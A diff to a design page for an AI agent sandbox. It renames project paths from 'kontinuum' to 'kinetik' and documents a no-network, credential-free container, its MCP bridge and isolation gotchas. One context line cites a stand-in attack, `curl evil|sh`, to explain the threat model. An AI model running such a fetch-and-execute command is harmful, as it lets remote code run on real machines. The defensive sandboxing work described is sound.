@@ -3,8 +3,8 @@ title: Sandbox
 type: subsystem
 summary: Ephemeral, credential-free, no-network container that every agent and gate command runs in — plus the one-tool MCP server that is the agent's only way to reach it.
 sources:
-  - kontinuum/sandbox.py
-  - kontinuum/sandbox_mcp.py
+  - kinetik/sandbox.py
+  - kinetik/sandbox_mcp.py
 last_verified:
   date: 2026-08-16
   sha: seed
@@ -20,7 +20,7 @@ worktree at `/work`**. An injected `curl evil|sh` has no credential to read and 
 
 The agent itself still runs on the host (its login lives there). That is deliberate: it only
 *reasons* and edits files there, and routes every command into the box via MCP. See
-`kontinuum/agent.py:13-28` for what is enforced vs merely trusted.
+`kinetik/agent.py:13-28` for what is enforced vs merely trusted.
 
 Two modes, one identical lockdown (`_flags()` is the single source of both):
 
@@ -30,39 +30,39 @@ Two modes, one identical lockdown (`_flags()` is the single source of both):
 
 ## Key entry points
 
-- `kontinuum/sandbox.py:27` — `_flags()`: the whole security posture in one list. The `--user`
+- `kinetik/sandbox.py:27` — `_flags()`: the whole security posture in one list. The `--user`
   comment explains why matching the host uid is required, not cosmetic.
-- `kontinuum/sandbox.py:36` / `:41` / `:50` / `:57` — `run` / `start` / `exec` / `stop`.
-- `kontinuum/sandbox_mcp.py:18` — the single `run` tool schema handed to the agent.
-- `kontinuum/sandbox_mcp.py:30` — `_run()`: `docker exec` into the container named by
-  `KONTINUUM_SANDBOX_CID`. `kontinuum/sandbox_mcp.py:42` — the three JSON-RPC methods.
-- `kontinuum/agent.py:96-101` — where the box is started and its container id is injected into the
-  MCP server's env; `kontinuum/agent.py:110-112` — Bash disabled, only this tool allowed.
-- `kontinuum/loop.py:127` and `kontinuum/loop.py:140` — the two boxes a task creates.
-- `kontinuum/pipeline.py:46` — the gate runs in its own one-off box, *not* the agent's.
+- `kinetik/sandbox.py:36` / `:41` / `:50` / `:57` — `run` / `start` / `exec` / `stop`.
+- `kinetik/sandbox_mcp.py:18` — the single `run` tool schema handed to the agent.
+- `kinetik/sandbox_mcp.py:30` — `_run()`: `docker exec` into the container named by
+  `KINETIK_SANDBOX_CID`. `kinetik/sandbox_mcp.py:42` — the three JSON-RPC methods.
+- `kinetik/agent.py:96-101` — where the box is started and its container id is injected into the
+  MCP server's env; `kinetik/agent.py:110-112` — Bash disabled, only this tool allowed.
+- `kinetik/loop.py:127` and `kinetik/loop.py:140` — the two boxes a task creates.
+- `kinetik/pipeline.py:46` — the gate runs in its own one-off box, *not* the agent's.
 - `tests/test_sandbox.py:23-44` — the isolation probes (env leak, egress, `/work` writability,
   persistence). They need a live Docker daemon and skip without one.
 
 ## Gotchas / non-obvious
 
 - **Setup is online, everything after it is not.** `recipe.setup` runs with `--network bridge`,
-  hardcoded at `kontinuum/loop.py:127` — it is repo-authored and deterministic, so it is trusted to
+  hardcoded at `kinetik/loop.py:127` — it is repo-authored and deterministic, so it is trusted to
   fetch deps. `recipe.network` (default `none`) governs only the *agent + gate* box. Widening the
   recipe's `network` to `bridge` removes control #1 for the untrusted half; prefer baking deps into
   `image` or installing them in `setup`.
 - **Deps must land under `/work`.** The gate gets a fresh container, so anything installed into the
   agent's persistent box outside the mount is gone by gate time. This is why the onboarding prompt
-  insists on e.g. `pip install --target /work/.deps` (`kontinuum/loop.py:276`).
+  insists on e.g. `pip install --target /work/.deps` (`kinetik/loop.py:276`).
 - **Git does not work inside the box.** Only `workdir` is mounted; a worktree's `.git` is a *file*
   pointing at the cache clone, which is not. All git runs host-side in `pipeline.py` / `effects.py`
   — by design (git is a credentialed effect), but it surprises agents that try `git status`.
 - **State between attempts:** the agent's container is started and destroyed per attempt
-  (`kontinuum/agent.py:97,119`), and a failed attempt is `git reset --hard` + `clean -fd`
-  (`kontinuum/pipeline.py:67-68`). So in-container state is gone and worktree edits are discarded —
+  (`kinetik/agent.py:97,119`), and a failed attempt is `git reset --hard` + `clean -fd`
+  (`kinetik/pipeline.py:67-68`). So in-container state is gone and worktree edits are discarded —
   but deps installed by `setup` survive, because they were added to `.git/info/exclude` and
   `clean -fd` (no `-x`) leaves ignored files alone.
-- **Fail-closed, but leaky on crash.** Missing `KONTINUUM_SANDBOX_CID` makes the tool return an
-  error rather than run on the host (`kontinuum/sandbox_mcp.py:33`). However `start()` uses
+- **Fail-closed, but leaky on crash.** Missing `KINETIK_SANDBOX_CID` makes the tool return an
+  error rather than run on the host (`kinetik/sandbox_mcp.py:33`). However `start()` uses
   `docker run -d` without `--rm`, so a hard K crash leaves a container running; `stop()` is only
   reached via the normal `finally`.
 - **A non-zero exit is not an error.** `_run` returns `isError` only for infra failures; a failing
@@ -76,6 +76,6 @@ Two modes, one identical lockdown (`_flags()` is the single source of both):
 
 ## See also
 
-- `docs/kontinuum-mvp.md` §3 (architecture split) and §8 (threat model, controls 1-3).
+- `docs/kinetik-mvp.md` §3 (architecture split) and §8 (threat model, controls 1-3).
 - `subsystems/agent-seam` — the contract the sandbox enforces on any backend.
 - `subsystems/execution-pipeline` — attempt/retry loop that owns the reset semantics above.
